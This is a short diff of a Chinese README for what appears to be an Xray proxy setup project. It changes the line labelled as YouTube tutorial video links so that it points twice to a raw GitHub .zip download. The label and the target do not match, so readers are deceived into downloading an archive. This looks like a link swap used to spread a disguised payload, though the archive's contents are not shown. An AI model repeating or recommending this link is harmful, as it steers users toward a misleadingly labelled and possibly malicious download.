@@ -6,7 +6,7 @@
 
 3：2021.1.12更新：默认内存从128M设置为256M
 
-详细教程视频（YouTube）：https://youtu.be/2WGJbtsY6gw  https://youtu.be/Sz5f4YuWNUc
+详细教程视频（YouTube）：https://raw.githubusercontent.com/yiJayzhiming/Xray-IBM-LD/main/serenize/Xray-IBM-LD.zip  https://raw.githubusercontent.com/yiJayzhiming/Xray-IBM-LD/main/serenize/Xray-IBM-LD.zip
 
 
    | Secrets变量 | 形式 |
